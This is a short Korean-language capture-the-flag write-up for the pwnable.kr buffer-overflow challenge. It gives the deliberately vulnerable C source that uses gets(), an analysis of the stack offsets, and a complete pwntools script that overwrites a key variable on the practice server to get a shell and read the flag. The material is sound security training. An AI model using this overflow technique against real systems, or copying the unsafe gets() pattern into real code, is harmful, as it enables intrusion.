https://pwnable.kr/play/3


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

### 🔎 코드 분석

```c
	gets(overflowme);	// smash me!
```

`func` 함수 내의 `gets`로 버퍼 오버플로우 가능


`overflowme`의 위치가 `ebp-0x2c`인 것을 알 수 있음

```c
if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
```


`ebp+0x8`에 key가 위치하는 것을 확인 가능

### 🗡️ 익스플로잇

key와 overflowme의 오프셋 차이는 0x34, 52

`‘A’*52+p32(0xcafebabe)` 익스플로잇 작성

```python
from pwn import *
context.log_level = 'debug'

p = remote('pwnable.kr', 10003)
p.sendlineafter(b'overflow me : ', b'A'*52 + p32(0xcafebabe))
p.sendline(b'cat flag')
print(p.recvall(timeout=5))
```